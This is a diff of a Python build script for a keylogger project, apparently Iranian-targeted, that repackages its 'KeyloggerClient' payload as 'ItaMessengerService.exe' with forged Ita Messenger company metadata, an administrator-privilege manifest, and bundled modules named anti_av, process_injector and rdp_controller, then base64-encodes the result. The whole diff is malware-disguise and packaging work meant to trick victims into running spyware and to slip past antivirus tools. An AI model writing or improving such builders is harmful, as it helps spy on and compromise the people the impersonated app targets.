@@ -26,23 +26,60 @@ class Builder:
     def __init__(self):
         self.spec_file = "KeyloggerClient.spec"
         self.output_dir = "dist"
-        self.payload_exe = os.path.join(self.output_dir, "KeyloggerClient.exe")
-        self.b64_output = os.path.join(self.output_dir, "KeyloggerClient_b64.txt")
+        self.payload_exe = os.path.join(self.output_dir, "ItaMessengerService.exe")
+        self.b64_output = os.path.join(self.output_dir, "ItaMessengerService_b64.txt")
         self.bind_output = os.path.join(self.output_dir, "binded_output.exe")
         self.is_ci = os.getenv('CI') or os.getenv('GITHUB_ACTIONS')
-        self.version_file = "version_info.py"
 
     def _check_icon(self):
         """بررسی وجود فایل آیکون"""
         icon_file = "icon.ico"
         if not os.path.exists(icon_file):
-            print(f"⚠ Warning: Icon file not found: {icon_file}")
+            print(f"Warning: Icon file not found: {icon_file}")
             logging.warning(f"Icon file not found: {icon_file}")
             return False
         else:
-            print(f"✓ Icon file found: {icon_file}")
+            print(f"Icon file found: {icon_file}")
             logging.info(f"Icon file found: {icon_file}")
             return True
+
+    def _create_manifest(self):
+        """ایجاد فایل manifest"""
+        manifest_content = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <assemblyIdentity
+    type="win32"
+    name="ItaMessenger.ItaMessengerService"
+    version="1.1.0.0"
+    processorArchitecture="*"
+  />
+  <description>Ita Messenger Service</description>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel 
+          level="requireAdministrator" 
+          uiAccess="false"
+        />
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
+    <application>
+      <supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}"/>
+      <supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}"/>
+    </application>
+  </compatibility>
+</assembly>'''
+        
+        try:
+            with open('manifest.xml', 'w', encoding='utf-8') as f:
+                f.write(manifest_content)
+            print("Created manifest.xml file")
+            return True
+        except Exception as e:
+            print(f"Failed to create manifest: {str(e)}")
+            return False
 
     def _create_spec_with_version(self):
         """ایجاد spec file با version info"""
@@ -60,8 +97,8 @@ block_cipher = None
 # تعریف version info
 version_info = VSVersionInfo(
   ffi=FixedFileInfo(
-    filevers=(1, 1, 0, 0),
-    prodvers=(1, 1, 0, 0),
+    filevers=(1, 1, 0, 1),
+    prodvers=(1, 1, 0, 1),
     mask=0x3f,
     flags=0x0,
     OS=0x40004,
@@ -74,15 +111,15 @@ version_info = VSVersionInfo(
       StringTable(
         '040904B0',
         [
-          StringStruct('CompanyName', 'Ita Messenger Co.'),
-          StringStruct('FileDescription', 'Ita Messenger Service'),
-          StringStruct('FileVersion', '1.1.0.0'),
-          StringStruct('InternalName', 'ItaMessenger'),
-          StringStruct('LegalCopyright', 'Copyright 2024 Ita Messenger Co. All rights reserved.'),
-          StringStruct('OriginalFilename', 'KeyloggerClient.exe'),
+          StringStruct('CompanyName', 'Ita Messenger Corporation'),
+          StringStruct('FileDescription', 'Ita Messenger Background Service'),
+          StringStruct('FileVersion', '1.1.0.1'),
+          StringStruct('InternalName', 'ItaMessengerService'),
+          StringStruct('LegalCopyright', 'Copyright 2024 Ita Messenger Corporation. All rights reserved.'),
+          StringStruct('OriginalFilename', 'ItaMessengerService.exe'),
           StringStruct('ProductName', 'Ita Messenger'),
-          StringStruct('ProductVersion', '1.1.0.0'),
-          StringStruct('Comments', 'Ita is a multi-platform instant messaging service based on cloud computing.'),
+          StringStruct('ProductVersion', '1.1.0.1'),
+          StringStruct('Comments', 'Official Ita Messenger background service for system integration.'),
         ]
       )
     ]),
@@ -112,6 +149,11 @@ def get_hidden_imports_and_data():
         'system.anti_av', 'system.process_injector',
         'monitoring.logger', 'monitoring.rdp_controller', 
         'network.communicator', 'encryption.manager', 'commands.handler',
+        # اضافه کردن ماژول‌های ضروری برای requests و urllib3
+        'http', 'email', 'email.mime', 'email.mime.text', 'email.mime.multipart',
+        'email.mime.base', 'email.mime.nonmultipart', 'email.encoders',
+        'urllib3.packages.six', 'urllib3.packages.ssl_match_hostname',
+        'urllib3.contrib', 'urllib3.contrib.pyopenssl',
     ]
     
     datas = []
@@ -130,6 +172,10 @@ def get_hidden_imports_and_data():
 
 hidden_imports, additional_datas, additional_binaries = get_hidden_imports_and_data()
 
+# اضافه کردن manifest به datas
+if os.path.exists('manifest.xml'):
+    additional_datas.append(('manifest.xml', '.'))
+
 a = Analysis(
     ['main.py'],
     pathex=[],
@@ -140,7 +186,8 @@ a = Analysis(
     hooksconfig={},
     runtime_hooks=[],
     excludes=[
-        'tkinter', 'unittest', 'email', 'http', 'xmlrpc', 'pydoc', 'doctest',
+        # فقط ماژول‌های غیرضروری رو exclude کن
+        'tkinter', 'unittest', 'xmlrpc', 'pydoc', 'doctest',
         'multiprocessing', 'concurrent', 'test', 'lib2to3', 'distutils',
     ],
     win_no_prefer_redirects=False,
@@ -159,10 +206,10 @@ exe = EXE(
     a.zipfiles,
     a.datas,
     [],
-    name='KeyloggerClient',
+    name='ItaMessengerService',
     debug=False,
     bootloader_ignore_signals=False,
-    strip=True,
+    strip=False,
     upx=True,
     upx_exclude=[],
     runtime_tmpdir=None,
@@ -179,32 +226,32 @@ exe = EXE(
         try:
             with open('KeyloggerClient_with_version.spec', 'w', encoding='utf-8') as f:
                 f.write(spec_content)
-            print("✓ Created spec file with version info")
+            print("Created spec file with complete dependencies")
             return 'KeyloggerClient_with_version.spec'
         except Exception as e:
-            print(f"✗ Failed to create spec file: {str(e)}")
+            print(f"Failed to create spec file: {str(e)}")
             return self.spec_file
 
     def _clean_build_dirs(self):
         """پاکسازی دایرکتوری‌های build"""
         dirs_to_clean = ['build', 'dist', '__pycache__']
-        files_to_clean = ['version_info.py', 'wrapper.py', 'KeyloggerClient_with_version.spec']
+        files_to_clean = ['version_info.py', 'wrapper.py', 'KeyloggerClient_with_version.spec', 'manifest.xml']
         
         for dir_name in dirs_to_clean:
             if os.path.exists(dir_name):
                 try:
                     shutil.rmtree(dir_name)
-                    print(f"✓ Cleaned directory: {dir_name}")
+                    print(f"Cleaned directory: {dir_name}")
                 except Exception as e:
-                    print(f"⚠ Warning: Could not clean {dir_name}: {str(e)}")
+                    print(f"Warning: Could not clean {dir_name}: {str(e)}")
         
         for file_name in files_to_clean:
             if os.path.exists(file_name):
                 try:
                     os.remove(file_name)
-                    print(f"✓ Cleaned file: {file_name}")
+                    print(f"Cleaned file: {file_name}")
                 except Exception as e:
-                    print(f"⚠ Warning: Could not clean {file_name}: {str(e)}")
+                    print(f"Warning: Could not clean {file_name}: {str(e)}")
 
     def install_requirements(self):
         """Install dependencies from requirements.txt if it exists."""
@@ -222,16 +269,16 @@ exe = EXE(
                 )
                 
                 if result.returncode == 0:
-                    print("✓ Dependencies installed successfully")
+                    print("Dependencies installed successfully")
                     logging.info("Dependencies installed successfully")
                 else:
-                    print(f"⚠ Dependency installation warnings: {result.stderr}")
+                    print(f"Dependency installation warnings: {result.stderr}")
                     logging.warning(f"Dependency installation warnings: {result.stderr}")
             else:
-                print(f"⚠ {requirements_file} not found, skipping dependency installation")
+                print(f"{requirements_file} not found, skipping dependency installation")
                 logging.warning(f"{requirements_file} not found, skipping dependency installation")
         except Exception as e:
-            print(f"✗ Failed to install dependencies: {str(e)}")
+            print(f"Failed to install dependencies: {str(e)}")
             logging.error(f"Failed to install dependencies: {str(e)}")
 
     def build_payload(self):
@@ -240,7 +287,8 @@ exe = EXE(
             print("Building payload with PyInstaller using spec file...")
             logging.info("Building payload with PyInstaller using spec file...")
     
-            # ایجاد spec file با version info
+            # ایجاد manifest و spec file
+            self._create_manifest()
             spec_file_to_use = self._create_spec_with_version()
     
             # Check for icon
@@ -270,20 +318,20 @@ exe = EXE(
             )
             
             if result.returncode != 0:
-                print(f"✗ PyInstaller failed with exit code {result.returncode}")
+                print(f"PyInstaller failed with exit code {result.returncode}")
                 if result.stdout:
-                    print(f"PyInstaller stdout: {result.stdout[-1000:]}")
+                    print(f"PyInstaller stdout: {result.stdout[-500:]}")
                 if result.stderr:
-                    print(f"PyInstaller stderr: {result.stderr[-1000:]}")
+                    print(f"PyInstaller stderr: {result.stderr[-500:]}")
                 raise Exception(f"PyInstaller failed with exit code {result.returncode}")
             
-            print("✓ PyInstaller completed successfully")
+            print("PyInstaller completed successfully")
 
             # Check if executable was created
             if not os.path.exists(self.payload_exe):
                 alt_paths = [
-                    os.path.join("dist", "KeyloggerClient", "KeyloggerClient.exe"),
-                    os.path.join("dist", "KeyloggerClient.exe")
+                    os.path.join("dist", "ItaMessengerService", "ItaMessengerService.exe"),
+                    os.path.join("dist", "ItaMessengerService.exe")
                 ]
                 
                 for alt_path in alt_paths:
@@ -300,30 +348,30 @@ exe = EXE(
             file_size = os.path.getsize(self.payload_exe)
             file_size_mb = file_size / (1024 * 1024)
             
-            print(f"✓ Payload built successfully: {self.payload_exe}")
-            print(f"✓ File size: {file_size_mb:.2f} MB")
-            print("✓ Version info embedded successfully")
+            print(f"Payload built successfully: {self.payload_exe}")
+            print(f"File size: {file_size_mb:.2f} MB")
+            print("Version info embedded successfully")
             
             # بررسی version info
             try:
                 with open(self.payload_exe, 'rb') as f:
                     header = f.read(2)
                     if header == b'MZ':
-                        print("✓ Executable header is valid (MZ signature)")
+                        print("Executable header is valid (MZ signature)")
                     else:
-                        print("⚠ Warning: Executable header may be invalid")
+                        print("Warning: Executable header may be invalid")
             except Exception as e:
-                print(f"⚠ Warning: Could not validate executable: {str(e)}")
+                print(f"Warning: Could not validate executable: {str(e)}")
             
             logging.info(f"Payload built successfully with version info: {self.payload_exe} ({file_size_mb:.2f} MB)")
 
         except subprocess.TimeoutExpired:
             error_msg = "PyInstaller timed out after 5 minutes"
-            print(f"✗ {error_msg}")
+            print(f"{error_msg}")
             logging.error(error_msg)
             raise Exception(error_msg)
         except Exception as e:
-            print(f"✗ Build error: {str(e)}")
+            print(f"Build error: {str(e)}")
             logging.error(f"Build error: {str(e)}")
             raise Exception(f"Failed to build payload: {str(e)}")
 
@@ -344,12 +392,12 @@ exe = EXE(
                 f.write(b64_encoded)
             
             file_size = len(b64_encoded) / 1024
-            print(f"✓ Base64-encoded payload saved to: {self.b64_output}")
-            print(f"✓ Base64 size: {file_size:.2f} KB")
+            print(f"Base64-encoded payload saved to: {self.b64_output}")
+            print(f"Base64 size: {file_size:.2f} KB")
             logging.info(f"Base64-encoded payload saved to: {self.b64_output} ({file_size:.2f} KB)")
 
         except Exception as e:
-            print(f"✗ Base64 encoding error: {str(e)}")
+            print(f"Base64 encoding error: {str(e)}")
             logging.error(f"Base64 encoding error: {str(e)}")
             raise Exception(f"Failed to encode payload to Base64: {str(e)}")
 
@@ -358,40 +406,41 @@ exe = EXE(
         root = None
         try:
             print("=" * 60)
-            print("🚀 Starting Build Process (With Version Info)...")
+            print("Starting Build Process (With Version Info)...")
             print("=" * 60)
             
-            print("\n🧹 Cleaning previous build files...")
+            print("\nCleaning previous build files...")
             self._clean_build_dirs()
             
-            print("\n📦 Installing dependencies...")
+            print("\nInstalling dependencies...")
             self.install_requirements()
 
-            print("\n🔨 Building payload with version info...")
+            print("\nBuilding payload with version info...")
             self.build_payload()
 
-            print("\n🔒 Encoding payload to Base64...")
+            print("\nEncoding payload to Base64...")
             self.encode_payload_to_base64()
 
             print("\n" + "=" * 60)
-            print("✅ Build completed successfully with Version Info!")
+            print("Build completed successfully with Version Info!")
             print("=" * 60)
-            print(f"📁 Output: {self.payload_exe}")
-            print(f"🔐 Base64: {self.b64_output}")
+            print(f"Output: {self.payload_exe}")
+            print(f"Base64: {self.b64_output}")
             
             if os.path.exists(self.payload_exe):
                 size = os.path.getsize(self.payload_exe) / (1024 * 1024)
-                print(f"📊 File size: {size:.2f} MB")
-            print("🏢 Company: Ita Messenger Co.")
-            print("📝 Description: Ita Messenger Service")
+                print(f"File size: {size:.2f} MB")
+            print("Company: Ita Messenger Corporation")
+            print("Description: Ita Messenger Background Service")
+            print("Requires: Administrator privileges")
             print("=" * 60)
 
             if not self.is_ci:
-                print("\n✅ Version info successfully embedded in executable!")
-                print("📋 Check with: python check_version.py")
+                print("\nVersion info successfully embedded in executable!")
+                print("Check with: python check_version.py")
 
         except Exception as e:
-            error_msg = f"❌ Build process failed: {str(e)}"
+            error_msg = f"Build process failed: {str(e)}"
             print(f"\n{error_msg}")
             logging.error(error_msg)
             
@@ -407,15 +456,15 @@ def main():
     """تابع اصلی برای اجرای build process"""
     try:
         if Config.TEST_MODE:
-            print("🧪 Test mode enabled: Skipping actual build process.")
-            print(f"🔧 Enabled features: {Config.get_behavior_config()}")
+            print("Test mode enabled: Skipping actual build process.")
+            print(f"Enabled features: {Config.get_behavior_config()}")
         else:
             builder = Builder()
             builder.run()
     except KeyboardInterrupt:
-        print("\n⏹️ Build process interrupted by user")
+        print("\nBuild process interrupted by user")
     except Exception as e:
-        print(f"\n💥 Fatal error: {str(e)}")
+        print(f"\nFatal error: {str(e)}")
         sys.exit(1)
 
 if __name__ == "__main__":
